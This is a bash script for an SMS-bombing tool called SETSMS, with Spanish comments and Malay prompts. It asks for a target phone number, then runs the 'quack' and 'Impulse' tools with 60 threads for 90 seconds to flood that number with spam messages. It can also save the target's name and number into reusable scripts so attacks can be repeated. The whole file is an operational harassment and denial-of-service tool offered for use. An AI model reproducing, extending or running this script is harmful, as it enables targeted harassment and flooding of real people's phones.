#!/bin/bash
#
# target: (26/01/2021)
#
# [Open Source] - [Código Abierto]
#
# Variables y Colores
#
PWD=$(pwd)
OS=$(uname -o)
USER=$(id -u)
verde='\033[32m'
blanco='\033[37m'
rojo='\033[31m'
azul='\033[34m'
negro='\033[0;30m'
rosa='\033[38;5;207m'
amarillo='\033[33m'
morado='\033[35m'
cian='\033[1;36m'
magenta='\033[1;35m'
#
# Mensaje de Opción Incorrecta
#
function Error {
echo -e "${rojo}
┌═════════════════════┐
█ ${blanco}¡SALAH PILIH LA WOI!! ${rojo}█
└═════════════════════┘
"${blanco}
sleep 0.5
}
#
# Banner SETSMS
#
function SETSMS {
	sleep 0.5
	clear
echo -e "${verde}
███████╗███████╗████████╗███████╗███╗   ███╗███████╗
██╔════╝██╔════╝╚══██╔══╝██╔════╝████╗ ████║██╔════╝
███████╗█████╗     ██║   ███████╗██╔████╔██║███████╗
╚════██║██╔══╝     ██║   ╚════██║██║╚██╔╝██║╚════██║
███████║███████╗   ██║   ███████║██║ ╚═╝ ██║███████║
╚══════╝╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚═╝╚══════╝"${blanco}
}
#
# Solicitando Número Telefónico
#
function PhoneNumber {
SETSMS
echo -e -n "${verde}
┌════════════════════════════┐
█ ${blanco}SILA MASUKKAN NOMBOR TARGET ${verde}█
└════════════════════════════┘
┃    ┌═════════┐  ┌═══════════════┐
└═>>>█ ${blanco}CONTOH ${verde}█=>█ ${azul}+593981480757 ${verde}█
┃    └═════════┘  └═══════════════┘
┃    ┌════════════════════════════════════════┐
└═>>>█ ${rojo}INGAT! MASUKKAN NOMBOR HP BESERTA KOD NEGARA ${verde}█
┃    └════════════════════════════════════════┘
┃
└═>>> "${blanco}
read -r PHONE
sleep 0.5

echo -e "${verde}
           ┌═════════════════┐
           █ ${azul}NOMBOR DISIMPAN ${verde}█
           └═════════════════┘
   ┌═════════════════════════════════┐
   █ ${blanco}Aku Malas Nak Translate......   ${verde}█
   █ ${blanco}UN NÚMERO TELEFÓNICO, TIENE QUE ${verde}█
   █ ${blanco}ESPERAR 24 HORAS PARA USARLA    ${verde}█
   █ ${blanco}NUEVAMENTE EN EL MISMO NÚMERO,  ${verde}█
   █ ${blanco}DE LO CONTRARIO, PUEDE QUE LA   ${verde}█
   █ ${blanco}HERRAMIENTA NO RESPONDA CON LA  ${verde}█
   █ ${blanco}MISMA CANTIDAD DE MENSAJES QUE  ${verde}█
   █ ${blanco}ENVIÓ EN LA PRIMERA VEZ...      ${verde}█
   └═════════════════════════════════┘
 ┌══════════════════════════════════════┐
 █ ${rojo}EL SPAM DE SMS PUEDE DURAR DE 2 A 3  ${verde}█
 █ ${rojo}MINUTOS, SIN EMBARGO, PUEDE CANCELAR ${verde}█
 █ ${rojo}EL PROCESO Y ENVÍO DE ESTOS MISMOS,  ${verde}█
 █ ${rojo}CON LA COMBINACIÓN DE TECLAS...      ${verde}█
 └══════════════════════════════════════┘
            ┌══════┐   ┌═══┐
            █ ${azul}CTRL ${verde}█ + █ ${azul}C ${verde}█
            └══════┘   └═══┘
┌═════════════════════════════════════════┐
█ ${blanco}TEKAN ENTER UMTUK MEMULAKAN SPAM SMS ${verde}█
└═════════════════════════════════════════┘
"${blanco}
read
}
#
# Llamando a las Herramientas Quack e Impulse
#
function SendSMS {
cd ${RUTA}/quack
python3 quack --tool SMS --target ${PHONE} --threads 60 --timeout 90
cd ${RUTA}/Impulse
python3 impulse.py --method SMS --time 90 --threads 60 --target ${PHONE}
cd ${RUTA}
}
function Backup {
SETSMS
echo -e -n "${verde}
┌════════════════════════════════════┐
█ ${blanco}SIMPAN NOMBOR DALAM SENARAI HITAM? ${verde}█
└════════════════════════════════════┘
┃
└═>>> ┃${azul} ${PHONE} ${verde}┃
┃
┃    ┌═══════════════════┐
└═>>>█ [${blanco}01${verde}] ┃ ${blanco}YA SIMPAN ${verde}█
┃    └═══════════════════┘
┃    ┌═══════════════════┐
└═>>>█ [${blanco}02${verde}] ┃ ${blanco}TAK NAK SIMPAN ${verde}█
┃    └═══════════════════┘
┃
└═>>> "${blanco}
read -r SCRIPT
sleep 0.5

if [[ ${SCRIPT} == 1 || ${SCRIPT} == 01 ]]; then
echo -e -n "${verde}
┌══════════════════════════════════┐
█ ${blanco}MASUKKAN NAMA UNTUK NOMBOR ANDA ${verde}█
└══════════════════════════════════┘
┃    ┌═════════┐  ┌═════════┐
└═>>>█ ${blanco}CONTOH ${verde}█=>█ ${azul}Darkmux ${verde}█
┃    └═════════┘  └═════════┘
┃
└═>>> "${blanco}
read -r NAME
sleep 0.5
echo -e "PHONE='${PHONE}'" >> ${RUTA}/tools/list.sh
echo -e "NAME='${NAME}'" >> ${RUTA}/tools/list.sh
echo -e 'echo -e "${blanco}${NAME} ${verde}=>${azul} ${PHONE}"
sleep 1' >> ${RUTA}/tools/list.sh
echo -e "PHONE='${PHONE}'" >> ${RUTA}/tools/spam.sh
echo -e "NAME='${NAME}'" >> ${RUTA}/tools/spam.sh
echo -e 'echo -e "${verde}
┌══════════┐
█ ${blanco}OBJEKTIF ${verde}█
└══════════┘
${blanco}
${NAME} ${verde}=>${azul} ${PHONE}"
sleep 1' >> ${RUTA}/tools/spam.sh
echo -e "source ${RUTA}/numbers/${NAME}.sh" >> ${RUTA}/tools/spam.sh
echo -e "#!/bin/bash
cd ${RUTA}/quack
python3 quack --tool SMS --target ${PHONE} --threads 60 --timeout 90
cd ${RUTA}/Impulse
python3 impulse.py --method SMS --time 90 --threads 60 --target ${PHONE}
cd ${RUTA}" >> ${RUTA}/numbers/${NAME}.sh
echo -e "${verde}
┌══════════════════════════════┐
█ ${blanco}NOMBOR DISIMPAN DALAM SCRIPT ${verde}█
└══════════════════════════════┘
┃
└═>>>${blanco} ${RUTA}/numbers/${NAME}.sh"${blanco}
elif [[ ${SCRIPT} == 2 || ${SCRIPT} == 02 ]]; then
exit
else
Error
Backup
fi
}
#
# Regresando al Menu Principal
#
function Restart {
echo -e "${verde}
┌════════════════════════════┐
█ ${blanco}PRESS ENTER TO CONTINUE ${verde}█
└════════════════════════════┘"${blanco}
read
source ${RUTA}/SETSMS.sh
}
#
# Declarando Funciones
#
PhoneNumber
SendSMS
Backup
Restart
